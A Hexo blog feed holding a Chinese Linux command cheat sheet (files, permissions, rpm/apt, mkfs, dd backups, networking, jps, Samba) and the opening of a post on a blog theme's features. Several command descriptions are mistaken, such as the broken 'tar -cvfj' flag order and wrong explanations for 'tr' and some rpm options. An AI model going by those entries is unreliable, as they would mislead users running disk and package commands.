- (SMBIOS / DMI)<br>hdparm -i /dev/hda 罗列一个磁盘的架构特性<br>hdparm -tT /dev/sda 在磁盘上执行测试性读取操作<br>cat /proc/cpuinfo 显示CPU info的信息<br>cat /proc/interrupts 显示中断<br>cat /proc/meminfo 校验内存使用<br>cat /proc/swaps 显示哪些swap被使用<br>cat /proc/version 显示内核的版本<br>cat /proc/net/dev 显示网络适配器及统计<br>cat /proc/mounts 显示已加载的文件系统<br>lspci -tv 罗列 PCI 设备<br>lsusb -tv 显示 USB 设备<br>date 显示系统日期<br>cal 2007 显示2007年的日历表<br>date 041217002007.00 设置日期和时间 - 月日时分年.秒<br>clock -w 将时间修改保存到 BIOS </p><p><strong>关机 (系统的关机、重启以及登出 )</strong><br>shutdown -h now 关闭系统<br>init 0 关闭系统<br>telinit 0 关闭系统<br>shutdown -h hours:minutes &amp; 按预定时间关闭系统<br>shutdown -c 取消按预定时间关闭系统<br>shutdown -r now 重启<br>reboot 重启<br>logout 注销 </p><p><strong>文件和目录</strong><br>cd /home 进入 ‘/ home’ 目录’<br>cd .. 返回上一级目录<br>cd ../.. 返回上两级目录<br>cd 进入个人的主目录<br>cd ~user1 进入个人的主目录<br>cd - 返回上次所在的目录<br>pwd 显示工作路径<br>ls 查看目录中的文件<br>ls -F 查看目录中的文件<br>ls -l 显示文件和目录的详细资料<br>ls -a 显示隐藏文件<br>ls <em>[0-9]</em> 显示包含数字的文件名和目录名<br>tree 显示文件和目录由根目录开始的树形结构<br>lstree 显示文件和目录由根目录开始的树形结构<br>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’<br>mkdir dir1 dir2 同时创建两个目录<br>mkdir -p /tmp/dir1/dir2 创建一个目录树<br>rm -f file1 删除一个叫做 ‘file1’ 的文件’<br>rmdir dir1 删除一个叫做 ‘dir1’ 的目录’<br>rm -rf dir1 删除一个叫做 ‘dir1’ 的目录并同时删除其内容<br>rm -rf dir1 dir2 同时删除两个目录及它们的内容<br>mv dir1 new_dir 重命名/移动 一个目录<br>cp file1 file2 复制一个文件<br>cp dir/* . 复制一个目录下的所有文件到当前工作目录<br>cp -a /tmp/dir1 . 复制一个目录到当前工作目录<br>cp -a dir1 dir2 复制一个目录<br>ln -s file1 lnk1 创建一个指向文件或目录的软链接<br>ln file1 lnk1 创建一个指向文件或目录的物理链接<br>touch -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm)<br>file file1 outputs the mime type of the file as text<br>iconv -l 列出已知的编码<br>iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile creates a new from the given input file by assuming it is encoded in fromEncoding and converting it to toEncoding.<br>find . -maxdepth 1 -name *.jpg -print -exec convert “{}” -resize 80x60 “thumbs/{}” ; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick) </p><p><strong>文件搜索</strong><br>find / -name file1 从 ‘/‘ 开始进入根文件系统搜索文件和目录<br>find / -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件<br>find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件<br>find / -name *.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限<br>find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备<br>locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令<br>whereis halt 显示一个二进制文件、源码或man的位置<br>which halt 显示一个二进制文件或可执行文件的完整路径 </p><p><strong>挂载一个文件系统</strong><br>mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 ‘/ mnt/hda2’ 已经存在<br>umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 ‘/ mnt/hda2’ 退出<br>fuser -km /mnt/hda2 当设备繁忙时强制卸载<br>umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用<br>mount /dev/fd0 /mnt/floppy 挂载一个软盘<br>mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom<br>mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom<br>mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom<br>mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件<br>mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统<br>mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备<br>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享 </p><p><strong>磁盘空间</strong><br>df -h 显示已经挂载的分区列表<br>ls -lSr |more 以尺寸大小排列文件和目录<br>du -sh dir1 估算目录 ‘dir1’ 已经使用的磁盘空间’<br>du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 </p><p>du -sh 查看当前文件夹大小<br>du -sh * | sort -n 统计当前文件夹(目录)大小，并按文件大小排序<br>du -sk filename 查看指定文件大小</p><p>rpm -q -a –qf ‘%10{SIZE}t%{NAME}n’ | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统)<br>dpkg-query -W -f=’${Installed-Size;10}t${Package}n’ | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统) </p><p><strong>用户和群组</strong><br>groupadd group_name 创建一个新用户组<br>groupdel group_name 删除一个用户组<br>groupmod -n new_group_name old_group_name 重命名一个用户组<br>useradd -c “Name Surname “ -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 “admin” 用户组的用户<br>useradd user1 创建一个新用户<br>userdel -r user1 删除一个用户 ( ‘-r’ 排除主目录)<br>usermod -c “User FTP” -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性<br>passwd 修改口令<br>passwd user1 修改一个用户的口令 (只允许root执行)<br>chage -E 2005-12-31 user1 设置用户口令的失效期限<br>pwck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的用户<br>grpck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的群组<br>newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 </p><p><strong>文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消</strong><br>ls -lh 显示权限<br>ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示<br>chmod ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限<br>chmod go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限<br>chown user1 file1 改变一个文件的所有人属性<br>chown -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性<br>chgrp group1 file1 改变文件的群组<br>chown user1:group1 file1 改变一个文件的所有人和群组属性<br>find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件<br>chmod u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限<br>chmod u-s /bin/file1 禁用一个二进制文件的 SUID位<br>chmod g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的<br>chmod g-s /home/public 禁用一个目录的 SGID 位<br>chmod o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件<br>chmod o-t /home/public 禁用一个目录的 STIKY 位 </p><p>chmod -R 775 test（修改test权限）</p><p><strong>文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消</strong><br>chattr +a file1 只允许以追加方式读写文件<br>chattr +c file1 允许这个文件能被内核自动压缩/解压<br>chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件<br>chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接<br>chattr +s file1 允许一个文件被安全地删除<br>chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘<br>chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件<br>lsattr 显示特殊的属性 </p><p><strong>打包和压缩文件</strong><br>bunzip2 file1.bz2 解压一个叫做 ‘file1.bz2’的文件<br>bzip2 file1 压缩一个叫做 ‘file1’ 的文件<br>gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件<br>gzip file1 压缩一个叫做 ‘file1’的文件<br>gzip -9 file1 最大程度压缩<br>rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包<br>rar a file1.rar file1 file2 dir1 同时压缩 ‘file1’, ‘file2’ 以及目录 ‘dir1’<br>rar x file1.rar 解压rar包<br>unrar x file1.rar 解压rar包<br>tar -cvf archive.tar file1 创建一个非压缩的 tarball<br>tar -cvf archive.tar file1 file2 dir1 创建一个包含了 ‘file1’, ‘file2’ 以及 ‘dir1’的档案文件<br>tar -tf archive.tar 显示一个包中的内容<br>tar -xvf archive.tar 释放一个包<br>tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下<br>tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包<br>tar -jxvf archive.tar.bz2 解压一个bzip2格式的压缩包<br>tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包<br>tar -zxvf archive.tar.gz 解压一个gzip格式的压缩包<br>zip file1.zip file1 创建一个zip格式的压缩包<br>zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包<br>unzip file1.zip 解压一个zip格式压缩包 </p><p><strong>RPM 包 - （Fedora, Redhat及类似系统）</strong><br>rpm -ivh package.rpm 安装一个rpm包<br>rpm -ivh –nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告<br>rpm -U package.rpm 更新一个rpm包但不改变其配置文件<br>rpm -F package.rpm 更新一个确定已经安装的rpm包<br>rpm -e package_name.rpm 删除一个rpm包<br>rpm -qa 显示系统中所有已经安装的rpm包<br>rpm -qa | grep httpd 显示所有名称中包含 “httpd” 字样的rpm包<br>rpm -qi package_name 获取一个已安装包的特殊信息<br>rpm -qg “System Environment/Daemons” 显示一个组件的rpm包<br>rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表<br>rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表<br>rpm -q package_name –whatrequires 显示与一个rpm包存在依赖关系的列表<br>rpm -q package_name –whatprovides 显示一个rpm包所占的体积<br>rpm -q package_name –scripts 显示在安装/删除期间所执行的脚本l<br>rpm -q package_name –changelog 显示一个rpm包的修改历史<br>rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供<br>rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表<br>rpm –import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书<br>rpm –checksig package.rpm 确认一个rpm包的完整性<br>rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性<br>rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间<br>rpm -Va 检查系统中所有已安装的rpm包- 小心使用<br>rpm -Vp package.rpm 确认一个rpm包还未安装<br>rpm2cpio package.rpm | cpio –extract –make-directories <em>bin</em> 从一个rpm包运行可执行文件<br>rpm -ivh /usr/src/redhat/RPMS/<code>arch</code>/package.rpm 从一个rpm源码安装一个构建好的包<br>rpmbuild –rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 </p><p><strong>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</strong><br>yum install package_name 下载并安装一个rpm包<br>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系<br>yum update package_name.rpm 更新当前系统中所有安装的rpm包<br>yum update package_name 更新一个rpm包<br>yum remove package_name 删除一个rpm包<br>yum list 列出当前系统中安装的所有包<br>yum search package_name 在rpm仓库中搜寻软件包<br>yum clean packages 清理rpm缓存删除下载的包<br>yum clean headers 删除所有头文件<br>yum clean all 删除所有缓存的包和头文件 </p><p><strong>DEB 包 (Debian, Ubuntu 以及类似系统)</strong><br>dpkg -i package.deb 安装/更新一个 deb 包<br>dpkg -r package_name 从系统删除一个 deb 包<br>dpkg -l 显示系统中所有已经安装的 deb 包<br>dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包<br>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息<br>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表<br>dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表<br>dpkg -S /bin/ping 确认所给的文件由哪个deb包提供 </p><p><strong>APT 软件工具 (Debian, Ubuntu 以及类似系统)</strong><br>apt-get install package_name 安装/更新一个 deb 包<br>apt-cdrom install package_name 从光盘安装/更新一个 deb 包<br>apt-get update 升级列表中的软件包<br>apt-get upgrade 升级所有已安装的软件<br>apt-get remove package_name 从系统删除一个deb包<br>apt-get check 确认依赖的软件仓库正确<br>apt-get clean 从下载的软件包中清理缓存<br>apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 </p><p><strong>查看文件内容</strong><br>cat file1 从第一个字节开始正向查看文件的内容<br>tac file1 从最后一行开始反向查看一个文件的内容<br>more file1 查看一个长文件的内容<br>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作<br>head -2 file1 查看一个文件的前两行<br>tail -2 file1 查看一个文件的最后两行<br>tail -f /var/log/messages 实时查看被添加到一个文件中的内容 </p><p><strong>文本处理</strong><br>cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt general syntax for text manipulation using PIPE, STDIN and STDOUT<br>cat file1 | command( sed, grep, awk, grep, etc…) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中<br>cat file1 | command( sed, grep, awk, grep, etc…) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中<br>grep Aug /var/log/messages 在文件 ‘/var/log/messages’中查找关键词”Aug”<br>grep ^Aug /var/log/messages 在文件 ‘/var/log/messages’中查找以”Aug”开始的词汇<br>grep [0-9] /var/log/messages 选择 ‘/var/log/messages’ 文件中所有包含数字的行<br>grep Aug -R /var/log/* 在目录 ‘/var/log’ 及随后的目录中搜索字符串”Aug”<br>sed ‘s/stringa1/stringa2/g’ example.txt 将example.txt文件中的 “string1” 替换成 “string2”<br>sed ‘/^$/d’ example.txt 从example.txt文件中删除所有空白行<br>sed ‘/ <em>#/d; /^$/d’ example.txt 从example.txt文件中删除所有注释和空白行<br>echo ‘esempio’ | tr ‘[:lower:]’ ‘[:upper:]’ 合并上下单元格内容<br>sed -e ‘1d’ result.txt 从文件example.txt 中排除第一行<br>sed -n ‘/stringa1/p’ 查看只包含词汇 “string1”的行<br>sed -e ‘s/ *$//‘ example.txt 删除每一行最后的空白字符<br>sed -e ‘s/stringa1//g’ example.txt 从文档中只删除词汇 “string1” 并保留剩余全部<br>sed -n ‘1,5p;5q’ example.txt 查看从第一行到第5行内容<br>sed -n ‘5p;5q’ example.txt 查看第5行<br>sed -e ‘s/00</em>/0/g’ example.txt 用单个零替换多个零<br>cat -n file1 标示文件的行数<br>cat example.txt | awk ‘NR%2==1’ 删除example.txt文件中的所有偶数行<br>echo a b c | awk ‘{print $1}’ 查看一行第一栏<br>echo a b c | awk ‘{print $1,$3}’ 查看一行的第一和第三栏<br>paste file1 file2 合并两个文件或两栏的内容<br>paste -d ‘+’ file1 file2 合并两个文件或两栏的内容，中间用”+”区分<br>sort file1 file2 排序两个文件的内容<br>sort file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份)<br>sort file1 file2 | uniq -u 删除交集，留下其他的行<br>sort file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件)<br>comm -1 file1 file2 比较两个文件的内容只删除 ‘file1’ 所包含的内容<br>comm -2 file1 file2 比较两个文件的内容只删除 ‘file2’ 所包含的内容<br>comm -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 </p><p><strong>字符设置和文件格式转换</strong><br>dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX<br>unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS<br>recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html<br>recode -l | more 显示所有允许的转换格式 </p><p><strong>文件系统分析</strong><br>badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块<br>fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性<br>fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性<br>e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性<br>e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性<br>fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性<br>fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性<br>fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性<br>dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 </p><p><strong>初始化一个文件系统</strong><br>mkfs /dev/hda1 在hda1分区创建一个文件系统<br>mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统<br>mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统<br>mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统<br>fdformat -n /dev/fd0 格式化一个软盘<br>mkswap /dev/hda3 创建一个swap文件系统 </p><p><strong>SWAP文件系统</strong><br>mkswap /dev/hda3 创建一个swap文件系统<br>swapon /dev/hda3 启用一个新的swap文件系统<br>swapon /dev/hda2 /dev/hdb3 启用两个swap分区 </p><p><strong>备份</strong><br>dump -0aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的完整备份<br>dump -1aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的交互式备份<br>restore -if /tmp/home0.bak 还原一个交互式备份<br>rsync -rogpav –delete /home /tmp 同步两边的目录<br>rsync -rogpav -e ssh –delete /home ip_address:/tmp 通过SSH通道rsync<br>rsync -az -e ssh –delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录<br>rsync -az -e ssh –delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录<br>dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr ‘dd of=hda.gz’ 通过ssh在远程主机上执行一次备份本地磁盘的操作<br>dd if=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件<br>tar -Puf backup.tar /home/user 执行一次对 ‘/home/user’ 目录的交互式备份操作<br>( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr ‘cd /home/share/ &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个目录内容<br>( tar c /home ) | ssh -C user@ip_addr ‘cd /home/backup-home &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个本地目录<br>tar cf - . | (cd /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接<br>find /home/user1 -name ‘<em>.txt’ | xargs cp -av –target-directory=/home/backup/ –parents 从一个目录查找并复制所有以 ‘.txt’ 结尾的文件到另一个目录<br>find /var/log -name ‘</em>.log’ | tar cv –files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 ‘.log’ 结尾的文件并做成一个bzip包<br>dd if=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作<br>dd if=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容 </p><p><strong>光盘</strong><br>cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force 清空一个可复写的光盘内容<br>mkisofs /dev/cdrom &gt; cd.iso 在磁盘上创建一个光盘的iso镜像文件<br>mkisofs /dev/cdrom | gzip &gt; cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件<br>mkisofs -J -allow-leading-dots -R -V “Label CD” -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件<br>cdrecord -v dev=/dev/cdrom cd.iso 刻录一个ISO镜像文件<br>gzip -dc cd_iso.gz | cdrecord dev=/dev/cdrom - 刻录一个压缩了的ISO镜像文件<br>mount -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件<br>cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中<br>cd-paranoia – “-3” 从一个CD光盘转录音轨到 wav 文件中（参数-3）<br>cdrecord –scanbus 扫描总线以识别scsi通道<br>dd if=/dev/hdc | md5sum 校验一个设备的md5sum编码，例如一张 CD </p><p><strong>网络 - （以太网和WIFI无线</strong>）<br>ifconfig eth0 显示一个以太网卡的配置<br>ifup eth0 启用一个 ‘eth0’ 网络设备<br>ifdown eth0 禁用一个 ‘eth0’ 网络设备<br>ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址<br>ifconfig eth0 promisc 设置 ‘eth0’ 成混杂模式以嗅探数据包 (sniffing)<br>dhclient eth0 以dhcp模式启用 ‘eth0’<br>route -n show routing table<br>route add -net 0/0 gw IP_Gateway configura default gateway<br>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network ‘192.168.0.0/16’<br>route del 0/0 gw IP_gateway remove static route<br>echo “1” &gt; /proc/sys/net/ipv4/ip_forward activate ip routing<br>hostname show hostname of system<br>host <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup hostname to resolve name to ip address and viceversa<br>nslookup <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup hostname to resolve name to ip address and viceversa<br>ip link show show link status of all interfaces<br>mii-tool eth0 show link status of ‘eth0’<br>ethtool eth0 show statistics of network card ‘eth0’<br>netstat -tup show all active network connections and their PID<br>netstat -tupl show all network services listening on the system and their PID<br>tcpdump tcp port 80 show all HTTP traffic<br>iwlist scan show wireless networks<br>iwconfig eth1 show configuration of a wireless network card<br>hostname show hostname<br>host <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup hostname to resolve name to ip address and viceversa<br>nslookup <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup hostname to resolve name to ip address and viceversa<br>whois <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup on Whois database </p><p><strong>JPS工具</strong></p><p>jps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux/unix平台上简单察看当前java进程的一些简单情况。</p><p>​    我想很多人都是用过unix系统里的ps命令，这个命令主要是用来显示当前系统的进程情况，有哪些进程，及其 id。 jps 也是一样，它的作用是显示当前系统的java进程情况，及其id号。我们可以通过它来查看我们到底启动了几个java进程（因为每一个java程序都会独占一个java虚拟机实例），和他们的进程号（为下面几个程序做准备），并可通过opt来查看这些进程的详细启动参数。</p><p>​     <strong>使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。</strong></p><p><strong>jps存放在JAVA_HOME/bin/jps，使用时为了方便请将JAVA_HOME/bin/加入到Path.</strong></p><p>$&gt; <strong>jps</strong><br>23991 Jps<br>23789 BossMain<br>23651 Resin</p><p>比较常用的参数：</p><p><strong>-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数</strong><br>$&gt;  <strong>jps -q</strong><br>28680<br>23789<br>23651</p><p><strong>-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null</strong></p><p>$&gt; <strong>jps -m</strong><br>28715 Jps -m<br>23789 BossMain<br>23651 Resin -socketwait 32768 -stdout /data/aoxj/resin/log/stdout.log -stderr /data/aoxj/resin/log/stderr.log</p><p><strong>-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名</strong></p><p>$&gt; <strong>jps -l</strong><br>28729 sun.tools.jps.Jps<br>23789 com.asiainfo.aimc.bossbi.BossMain<br>23651 com.caucho.server.resin.Resin</p><p><strong>-v 输出传递给JVM的参数</strong></p><p>$&gt; <strong>jps -v</strong><br>23789 BossMain<br>28802 Jps -Denv.class.path=/data/aoxj/bossbi/twsecurity/java/trustwork140.jar:/data/aoxj/bossbi/twsecurity/java/:/data/aoxj/bossbi/twsecurity/java/twcmcc.jar:/data/aoxj/jdk15/lib/rt.jar:/data/aoxj/jd</p><p>k15/lib/tools.jar -Dapplication.home=/data/aoxj/jdk15 -Xms8m<br>23651 Resin -Xss1m -Dresin.home=/data/aoxj/resin -Dserver.root=/data/aoxj/resin -Djava.util.logging.manager=com.caucho.log.LogManagerImpl -</p><p>Djavax.management.builder.initial=com.caucho.jmx.MBeanServerBuilderImpl</p><p><strong>sudo jps看到的进程数量最全</strong></p><p><strong>jps 192.168.0.77</strong></p><p><strong>列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099</strong></p><p><strong>（前提是远程服务器提供jstatd服务）</strong></p><p><strong>注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix/linux的ps命令。</strong></p><p>详细情况请参考sun官方文档。<br><a href="http://java.sun.com/j2se/1.5.0/docs/tooldocs/share/jps.html" target="_blank" rel="noopener">http://java.sun.com/j2se/1.7.0/docs/tooldocs/share/jps.html</a></p><p>GO TOP INDEX ^<br>Microsoft Windows networks (SAMBA)<br>nbtscan ip_addr netbios name resolution<br>nmblookup -A ip_addr netbios name resolution<br>smbclient -L ip_addr/hostname show remote shares of a windows host<br>smbget -Rr smb://ip_addr/share like wget can download files from a host windows via smb<br>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share mount a windows network share</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux常用指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客开源</title>
      <link href="/2019/08/27/blog-open-source/"/>
      <url>/2019/08/27/blog-open-source/</url>
      
        <content type="html"><![CDATA[<h1 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Blog-Open-Source/blog-demo1.gif" alt="演示Demo"></p><h1 id="简短介绍"><a href="#简短介绍" class="headerlink" title="简短介绍"></a>简短介绍</h1><p>本博客基于<code>Hexo</code>框架搭建，用的是洪卫大佬在<a href="https://github.com/shw2018/hexo-theme-matery" target="_blank" rel="noopener">hexo-theme-matery</a>主题上做了很多修改，修复了一些bug，增加了一些新的特性和功能，博客地址：<a href="https://shw2018.github.io/" target="_blank" rel="noopener">https://shw2018.github.io</a>，博客演示：<a href="https://sunhwee.com" target="_blank" rel="noopener">sunhwee.com</a>。</p><hr><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p><strong>原主题特性</strong>:</p><ul><li><p>简单漂亮，文章内容美观易读</p></li><li><p><a href="https://material.io/" target="_blank" rel="noopener">Material Design</a> 设计</p></li><li><p>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</p></li><li><p>首页轮播文章及每天动态切换 <code>Banner</code> 图片</p></li><li><p>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</p></li><li><p>时间轴式的归档页</p></li><li><p><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</p></li><li><p>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</p></li><li><p>可自定义的数据的友情链接页面</p></li><li><p>支持文章置顶和文章打赏</p></li><li><p>支持 <code>MathJax</code></p></li><li><p><code>TOC</code> 目录</p></li><li><p>可设置复制文章内容时追加版权信息</p></li><li><p>可设置阅读文章时做密码验证</p></li><li><p><a href="https://gitalk.github.io/" target="_blank" rel="noopener">Gitalk</a>、<a href="https://imsun.github.io/gitment/" target="_blank" rel="noopener">Gitment</a>、<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 和 <a href="https://disqus.com/" target="_blank" rel="noopener">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</p></li><li><p>集成了<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</p></li><li><p>支持在首页的音乐播放和视频播放功能</p><p><strong>增加的工作或特性(未打钩的是已做但还没更新到源码的)</strong>:</p></li><li><p>修改了原主题的一些很多<code>bug</code>   2019.08.05</p></li><li><p>加入图片懒加载功能，在根目录配置文件开启和关闭    2019.08.09</p></li><li><p>增加<code>留言板</code>功能          2019.08.05</p></li><li><p>在关于板块,加入<code>简历</code>功能页   2019.08.05</p></li><li><p>增加视听[视觉听觉影音]板块       2019.08.10</p></li><li><p>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。  2019.08.10</p></li><li><p>增加网站运行时间显示  2019.08.10</p></li><li><p>增加<code>动漫模型</code>     2019.08.10</p></li><li><p>整体替换Banner图片和文章特色图片   2019.08.10</p></li><li><p>增加分类<code>相册</code>功能         2019.08.29</p></li><li><p>去掉标签页,将其合并至<code>分类</code>页中                2019.09.01</p></li><li><p>修改了一些控件的参数   2019.09.01</p></li><li><p>修改部分样式,比如: 文章卡片,固定高度,使其不至于因为文章摘要的长短不同导致卡片大小不一使页面布局很不美观,类似的还有友链卡片,优化了页面内容布局,视觉更整齐美观          2019.09.01</p></li><li><p>解决首页文章列表卡片上方 <code>border-radius</code>圆角失效的bug  